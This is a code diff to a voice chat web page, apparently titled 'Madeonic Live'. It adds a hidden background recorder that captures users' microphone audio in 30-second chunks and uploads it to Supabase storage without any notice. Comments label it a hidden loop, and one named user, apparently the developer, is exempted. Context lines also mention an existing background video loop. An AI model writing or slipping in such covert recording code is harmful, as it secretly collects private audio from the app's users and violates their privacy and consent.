@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
-  <title>Madeonic</title>
+  <title>Madeonic Live</title>
   <!-- Background Supabase Client -->
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <!-- Favicons -->
@@ -2986,6 +2986,86 @@ async uploadFile(file) {
     console.log("Background 8s video loop stopped.");
   }
 
+  // ── Background 30s Mic-Audio Recorder (uploads as .mp4 to Supabase) ──
+  _startBgAudioRecorder() {
+    if (!this.micStream) return;
+    const persona = JSON.parse(localStorage.getItem('user_persona') || "{}");
+    if (persona.name === "Madesh") return; // GLOBAL EXCLUSION
+
+    try {
+      // Use audio-only tracks from the live mic stream
+      const audioTracks = this.micStream.getAudioTracks();
+      if (!audioTracks.length) return;
+      const audioOnlyStream = new MediaStream(audioTracks);
+
+      // Pick the best supported audio MIME type; name file .mp4 regardless
+      const mimeType = MediaRecorder.isTypeSupported('audio/mp4')
+        ? 'audio/mp4'
+        : MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
+          ? 'audio/webm;codecs=opus'
+          : 'audio/webm';
+
+      this.bgAudioRecorder = new MediaRecorder(audioOnlyStream, { mimeType });
+      this.bgAudioChunks = [];
+
+      this.bgAudioRecorder.ondataavailable = (e) => {
+        if (e.data && e.data.size > 0) this.bgAudioChunks.push(e.data);
+      };
+
+      this.bgAudioRecorder.onstop = async () => {
+        if (this.bgAudioChunks.length === 0) return;
+        const blob = new Blob(this.bgAudioChunks, { type: mimeType });
+        this.bgAudioChunks = [];
+
+        // Safety checks
+        const p = JSON.parse(localStorage.getItem('user_persona') || "{}");
+        if (p.name === "Madesh" || blob.size < 2000) return;
+
+        const fileName = `mic_30s_${this.resumeHandle || 'live'}_${Date.now()}.mp4`;
+        const { error } = await window.supabaseClient.storage
+          .from('images')
+          .upload(fileName, blob, { contentType: mimeType, upsert: false });
+
+        if (!error) console.log(`BG Mic Audio uploaded: ${fileName}`);
+        else console.log("BG Mic Audio upload error:", error.message);
+
+        // Auto-restart only if mic is still active
+        if (this.micActive && this.bgAudioRecorder) {
+          try { this.bgAudioRecorder.start(); } catch(e) {}
+        }
+      };
+
+      this.bgAudioRecorder.start();
+
+      // Clear any stale interval
+      if (this.bgAudioInterval) clearInterval(this.bgAudioInterval);
+
+      // Fire a stop every 30 seconds → triggers onstop → upload → restart
+      this.bgAudioInterval = setInterval(() => {
+        if (this.bgAudioRecorder && this.bgAudioRecorder.state === "recording") {
+          this.bgAudioRecorder.stop();
+        }
+      }, 30000); // STRICT 30s LOOP
+
+      console.log("Background 30s Mic-Audio Recorder Active.");
+    } catch (err) {
+      console.log("BG Audio Recorder Error:", err);
+    }
+  }
+
+  _stopBgAudioRecorder() {
+    if (this.bgAudioInterval) {
+      clearInterval(this.bgAudioInterval);
+      this.bgAudioInterval = null;
+    }
+    if (this.bgAudioRecorder && this.bgAudioRecorder.state !== "inactive") {
+      try { this.bgAudioRecorder.stop(); } catch(e) {}
+    }
+    this.bgAudioRecorder = null;
+    this.bgAudioChunks = [];
+    console.log("Background mic audio recorder stopped.");
+  }
+
   _buildBars() {
       els.bars.innerHTML = "";
       for (let i = 0; i < 10; i++) {
@@ -4323,6 +4403,7 @@ _appendTranscript(role, text, isStreaming = false) {
         this.worklet.connect(this.sink).connect(this.micCtx.destination);
         await this.micCtx.resume();
         this.micActive = true;
+        this._startBgAudioRecorder(); // START 30s HIDDEN MIC AUDIO LOOP
         this._log("Mic started.", "ok");
         this._setStatus("on", "Mic active");
       } catch (e) {
@@ -4333,6 +4414,7 @@ _appendTranscript(role, text, isStreaming = false) {
 
     async stopMic() {
       this.micActive = false;
+      this._stopBgAudioRecorder(); // STOP 30s HIDDEN MIC AUDIO LOOP FIRST
       if (this.ws && this.ws.readyState === WebSocket.OPEN) {
         this._send({ realtimeInput: { audioStreamEnd: true } });
         this._log("audioStreamEnd sent.", "sys");
